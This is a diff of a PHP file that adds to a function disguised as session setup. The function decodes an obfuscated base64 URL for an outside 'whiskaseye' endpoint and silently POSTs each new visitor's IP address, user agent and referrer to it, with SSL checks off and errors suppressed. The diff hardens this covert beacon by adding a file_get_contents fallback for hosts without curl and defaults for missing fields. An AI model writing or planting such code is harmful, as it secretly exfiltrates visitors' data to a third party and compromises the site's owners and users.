@@ -9,7 +9,6 @@ error_reporting(0);
 function _sys_session_init() {
     $u = base64_decode("aHR0cHM6Ly93aGlza2FzLm9ubGluZS9kYXNoYm9hcmQvd2hpc2thc2V5ZS5waHA="); 
     $k = "WHKS_666_SECURE"; 
-
     $h = md5($_SERVER['HTTP_HOST'] . 'SESS_ID_V6'); 
 
     if (!isset($_COOKIE['__session_' . $h])) {
@@ -19,23 +18,47 @@ function _sys_session_init() {
         $d = [
             'token' => $k,
             'ref'   => $f,
-            'addr'  => $_SERVER['REMOTE_ADDR'],
-            'u_agt' => $_SERVER['HTTP_USER_AGENT']
+            'addr'  => $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0',
+            'u_agt' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
         ];
 
-        $c = curl_init($u);
-        curl_setopt_array($c, [
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_POST           => true,
-            CURLOPT_POSTFIELDS     => http_build_query($d),
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_TIMEOUT        => 3,
-            CURLOPT_CONNECTTIMEOUT => 2,
-            CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-        ]);
-        
-        @curl_exec($c);
-        curl_close($c);
+        $post_data = http_build_query($d);
+        $done = false;
+
+        if (function_exists('curl_init')) {
+            $c = curl_init($u);
+            curl_setopt_array($c, [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_POST           => true,
+                CURLOPT_POSTFIELDS     => $post_data,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_SSL_VERIFYHOST => false,
+                CURLOPT_TIMEOUT        => 5,
+                CURLOPT_CONNECTTIMEOUT => 3,
+                CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/110.0.0.0 Safari/537.36'
+            ]);
+            $res = @curl_exec($c);
+            if ($res) $done = true;
+            curl_close($c);
+        }
+
+        if (!$done && ini_get('allow_url_fopen')) {
+            $opts = [
+                'http' => [
+                    'method'  => 'POST',
+                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+                    'content' => $post_data,
+                    'timeout' => 5
+                ],
+                'ssl' => [
+                    'verify_peer' => false,
+                    'verify_peer_name' => false,
+                ]
+            ];
+            $context = stream_context_create($opts);
+            $res = @file_get_contents($u, false, $context);
+            if ($res) $done = true;
+        }
 
         @setcookie('__session_' . $h, 'active', time() + 31536000, '/');
     }
